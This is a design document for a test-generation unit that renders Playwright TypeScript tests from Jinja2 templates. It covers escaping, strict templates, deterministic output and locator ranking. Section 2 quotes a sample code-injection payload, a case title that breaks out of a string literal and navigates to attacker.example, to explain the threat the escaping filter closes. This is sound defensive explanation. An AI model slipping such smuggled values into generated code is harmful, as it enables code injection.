# NFR Design Patterns — U5 Automation Emission

**Phase**: CONSTRUCTION | **Unit**: U5 | **Stage**: NFR Design
**Version**: 1.0 | **Date**: 2026-08-30

Four patterns specific to U5, on top of the 41 inherited from U1, U7, U2, U3 and U4.

U5 is the first unit whose output leaves the system. Every pattern here exists because
generated code is read by a compiler, maintained by a person, and pushed to a
repository — three consumers no prior unit had.

---

## 1. Inherited

| Pattern | Use in U5 |
|---|---|
| P-U4-04 Three-outcome emission | Every generated file, through the generalised table |
| P-U4-01 Deferred allocation | `AT-` identifiers, issued after every refusal is known |
| P-U4-03 Value screening in the domain | The shape the secret scanner follows |
| P-RES-01 Unit of Work | One transaction per emission |
| P-SCL-01 Capped pagination | Case queries per feature |
| P-SEC-01 Two-level validation | Pydantic at the boundary, refusals beneath |
| P-SEC-03 Message sanitisation | A refusal names a field, **never the secret's value** |
| P-OBS-01 Correlation propagation | Emission carries the run id |
| P-U7-02 Read-only gate evaluation | Before emission |
| P-MNT-02 Import contracts | Enforce that U5 holds no classification logic |

**P-SEC-03 does more work here than anywhere.** A refusal for a literal credential must
report *where* without reporting *what* — quoting the offending value would copy the
secret into the log, which is the failure the check exists to prevent. U4 learned the
same lesson for personal data; here the value is a credential and the log may be
shipped with the handover.

---

## 2. P-U5-01: Escaping at the Point of Use

**Delivers**: U5-NFR-SEC-06

A single `ts` filter, registered on the environment, applied at every interpolation:

```jinja
test({{ case.id | ts }} + ' ' + {{ case.title | ts }}, { ... })
```

```python
def ts_literal(value: object) -> str:
    """A correctly quoted JS string literal for any Python string."""
    return json.dumps("" if value is None else str(value), ensure_ascii=False)
```

### Why `json.dumps` rather than a hand-written escaper

JSON string syntax is a subset of JavaScript string syntax, and `json.dumps` already
handles quotes, backslashes, newlines, tabs and control characters correctly. A
hand-written escaper would be a second implementation of a solved problem, and the
class of bug it would introduce — one unescaped character, discovered when a case title
happens to contain it — is exactly the class this pattern exists to eliminate.

`ensure_ascii=False` keeps non-ASCII characters readable in the generated file rather
than emitting `é`. Determinism is unaffected: the same input produces the same
bytes either way.

### Why a filter and not service-side escaping

All three options considered escape correctly. The difference is what a reviewer sees.

| | Escape visible in the template? | A missing escape is |
|---|---|---|
| Service-side | No | Invisible |
| Wrapper type | Partly | Invisible at the call site |
| **Jinja2 filter** | **Yes** | **A visible omission** |

**The templates are the artefact the Automation Engineer reviews.** An escape applied
somewhere else is an escape they must take on trust; `| ts` on every interpolation is
something they can check by reading. It also makes the double-escape mistake
impossible: applying `| ts` twice produces visibly wrong output in the first test that
renders.

### The injection surface, stated plainly

Case titles, step actions and expected results are agent-supplied text that lands
inside TypeScript string literals. A title containing

```
'; await page.goto('http://attacker.example'); //
```

is a code-injection path if interpolated raw. **This is the only place in the system
where untrusted text becomes executable code**, and the filter is what closes it.

---

## 3. P-U5-02: Strict Template Environment

**Delivers**: U5-NFR-REL-01, -02, U5-NFR-MNT-01 to -04

One environment, explicitly configured, built once:

```python
Environment(
    loader=PackageLoader("tto_testgen", "templates/playwright"),
    autoescape=False,            # HTML escaping would corrupt TypeScript
    undefined=StrictUndefined,   # the important one
    trim_blocks=True,
    lstrip_blocks=True,
    keep_trailing_newline=True,
)
```

### `StrictUndefined` is the setting that matters

Jinja2's default renders an undefined variable as the empty string. In generated code
that means a typo'd variable name produces:

```typescript
readonly submitButton = this.page.getByRole('button', { name: '' });
```

**Which compiles.** It fails much later, as a locator that matches nothing, in a CI run
where the cause is not visible. `StrictUndefined` turns it into a render-time error
naming the template and the variable — a build failure instead of a mystery.

This is the same reasoning that made `foreign_keys = ON` non-negotiable in U1: a
silent, plausible wrong answer is worse than a loud failure.

### The whitespace settings are determinism, not cosmetics

`trim_blocks`, `lstrip_blocks` and `keep_trailing_newline` fix the whitespace a
template block produces. Without them, an editor reformatting a template — or a
contributor's editor stripping a trailing newline — changes the rendered bytes without
changing the rendered meaning, and every file reports as hand-edited on the next run.

### `PackageLoader`, not a filesystem path

Templates ship inside the package. A filesystem path would resolve differently
depending on the working directory, which makes the output depend on where the operator
happened to run the tool.

---

## 4. P-U5-03: Deterministic Rendering

**Delivers**: U5-NFR-REL-01, -02, -05, U5-NFR-PRF-03

Three exclusions and two orderings, asserted rather than assumed.

| Excluded | Because |
|---|---|
| Timestamps | Every regeneration differs; every file reports as edited |
| Run identifiers | Same |
| Absolute paths | They differ per workstation, so two engineers' output conflicts |

| Ordered by | Never |
|---|---|
| Cases: identifier | Insertion order |
| Page objects: screen slug | Query order |
| Imports: sorted | Set iteration order |

### Why the second emission writing zero files is the real test

U5-NFR-PRF-03 and -REL-05 are the same assertion viewed twice. Rendering twice in a
unit test and comparing strings proves the renderer is deterministic for the shapes the
test used. **Running a whole-project emission twice and asserting nothing was written**
proves it end to end, over the real corpus, including the parts nobody wrote a test
for — and an operator can run it themselves before a handover.

It is also the assertion that fails loudly if any of the three exclusions is forgotten.
A timestamp added to a template header would pass every property test that compares two
renders in the same second, and fail this one on the next day's run. The benchmark
renders, writes, and renders again in one pass, so the failure is immediate rather than
intermittent.

### The set-ordering trap

Python's set iteration order is stable within a process and not across them, because it
depends on hash randomisation for strings. An unsorted `set` of imports would produce
identical output all day in one session and different output tomorrow — the worst
possible failure shape, because it looks like a hand-edit on a file nobody touched.

---

## 5. P-U5-04: Ranked Resolution

**Delivers**: U5-NFR-MNT-02, -04, U5-NFR-PRF-04

Locator selection is a fixed ladder returning the first match, not a scored choice.

```
getByRole > getByLabel > getByPlaceholder/getByText > getByTestId > CSS
```

XPath is **absent from the ladder**, not last on it.

### Why ranked and not scored

A score implies a situation where a CSS selector could outrank an accessible role.
There is none: the accessible role is what the user perceives, and it survives the
structural changes that break CSS. A weighting would only obscure a fixed order behind
arithmetic that always produces the same answer.

**Absence is the enforcement for XPath.** Ranking it last would still generate it when
nothing else is available; leaving it out means the page object omits the element and
the case is marked at risk — which is the honest outcome, because an element with no
semantic locator and no test id is one the application should expose better.

### The annotations are part of the rendered content

`UNVERIFIED` and `FRAGILE` comments sit inside the hashed output, so removing one is a
hand-edit and is reported. The same property protects U4's generated-file banner, and
it matters more here: the comment is the only thing distinguishing a locator that works
from one that ought to.

---

## 6. Patterns Considered and Declined

| Pattern | Why not |
|---|---|
| **Parallel per-feature rendering** | It would meet a 10-second whole-project budget and introduce non-deterministic file ordering. Determinism is this unit's acceptance criterion; 60 seconds for an occasional operation costs nothing |
| **A golden-file corpus** | Every legitimate template change would require regenerating hundreds of fixtures, which in practice means regenerating without reading the diff |
| **Running Prettier over the output** | The formatting must be ours. A tool's output changes between its versions, which would make regeneration non-deterministic across a dependency upgrade |
| **A TypeScript parser to validate syntax** | It validates against a second implementation of TypeScript. Syntactic validity is caught the first time anyone runs the project; the properties assert the things that would otherwise go unnoticed |
| **Caching rendered templates** | Jinja2 already compiles templates once per environment. A second cache would add invalidation with nothing to gain |
| **A sandboxed Jinja2 environment** | `SandboxedEnvironment` protects against untrusted *templates*. The templates are ours and reviewed; the untrusted input is the *data*, which P-U5-01 handles. Sandboxing would address the wrong threat and imply the right one was covered |

**The last one is worth dwelling on**, because reaching for `SandboxedEnvironment`
would look like diligence. It restricts what a template author can do — relevant when
users supply templates, which they never do here. The actual threat is agent-supplied
data reaching a code context, and a sandbox does nothing about that. Choosing it would
have produced a security control that addressed no real risk while creating the
impression the real one was handled.

---

## 7. Pattern-to-Requirement Coverage

| Requirement group | Delivered by |
|---|---|
| U5-NFR-PRF-01, -02 | Per-feature rendering, compiled templates |
| U5-NFR-PRF-03 | **P-U5-03**, P-U4-04 |
| U5-NFR-PRF-04 | **P-U5-04**, L12 |
| U5-NFR-PRF-05 | P-U4-04's `unchanged` outcome |
| U5-NFR-SCL-01 to -04 | P-SCL-01, per-feature streaming |
| U5-NFR-REL-01, -02 | **P-U5-02**, **P-U5-03** |
| U5-NFR-REL-03 | P-U4-04 |
| U5-NFR-REL-04 | `input_hash` on `automated_test` |
| U5-NFR-REL-05 | **P-U5-03** |
| U5-NFR-REL-06 | P-RES-01, refuse-before-write ordering |
| U5-NFR-REL-07 | L2 migration runner |
| U5-NFR-SEC-01, -02 | L13 `SecretScanner` |
| U5-NFR-SEC-03 | `env.example.j2` |
| U5-NFR-SEC-04 | Property over rendered output |
| U5-NFR-SEC-05 | L11 destination handling, slug validation |
| U5-NFR-SEC-06 | **P-U5-01** |
| U5-NFR-MNT-01 to -04 | **P-U5-02**, **P-U5-04**, properties |
| U5-NFR-MNT-05 | **P-MNT-02** import contracts |
| U5-NFR-MNT-06 | Pinned versions in `package.json.j2`, from config |

**All 28 U5 NFR requirements have a delivering pattern or component.**
